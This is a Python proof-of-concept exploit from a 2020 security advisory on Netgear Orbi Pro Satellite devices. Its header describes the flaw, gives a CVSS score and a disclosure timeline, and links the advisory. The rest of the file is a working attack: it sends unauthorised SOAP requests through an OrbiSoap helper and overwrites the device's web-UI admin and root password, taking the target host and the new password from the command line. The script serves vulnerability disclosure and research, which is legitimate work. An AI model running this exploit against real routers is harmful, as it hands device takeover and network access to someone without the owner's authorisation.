#!python3

# Copyright (c) 2020, modzero AG, Thorsten Schroeder <ths@modzero.ch>
# See the LICENSE file for details.
#
# Netgear Orbi Pro Satellite  -  unauthorized data write
# -- Proof of Concept exploit --
# CVSS:3.1 AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N -> 8.1
#
# This script allows to update the Web-UI admin- AND system root-password via unauthorized SOAP request.
# No authorization is necessary. Currently it is necessary being located in one of the wireless networks or
# on the LAN, connected to the Orbi Pro Router. The latter must be set up in Access-Point (AP) Mode.
#
# See https://www.modzero.com/advisories/Netgear-Orbi-Pro-Security-MZ-20-02.txt for details and
# background. Find all tools and exploits at https://github.com/modzero/MZ-20-02-NETGEAR-Orbi-Security
#
# 2020/01/05 - found issues
# 2020/01/06 - finished first poc exploit
# 2020/01/15 - finished draft report/security advisory
#

import socket
import sys
from netgear import OrbiSoap


def set_password(hostname, user, password):
    host = socket.gethostbyname(hostname)

    soap = OrbiSoap(host)
    sessionid = soap.authenticate()

    if not sessionid:
        print("[!] failed to authenticate at ORBI SOAP service.")
        return False

    soap.configuration_started()
    ret = soap.update_admin_password(password)
    soap.set_configuration_timestamp()
    soap.configuration_finished()
    return ret


# demo
def main(ac, av):
    ret = False

    if ac == 4:
        pwd = av[3]
        usr = av[2]
        host = av[1]
        ret = set_password(host, usr, pwd)
    elif ac == 3:
        pwd = av[2]
        host = av[1]
        ret = set_password(host, "admin", pwd)
    else:
        print("usage: {} <host> [user] <new-password>".format(av[0]))
        sys.exit(0)

    if ret:
        print("[*] Successfully set admin-password on {} to {}".format(host, pwd))


if __name__ == "__main__":
    # main(4, ["script.py", "10.11.42.243", "admin", "fckNzs23"])
    main(len(sys.argv), sys.argv)
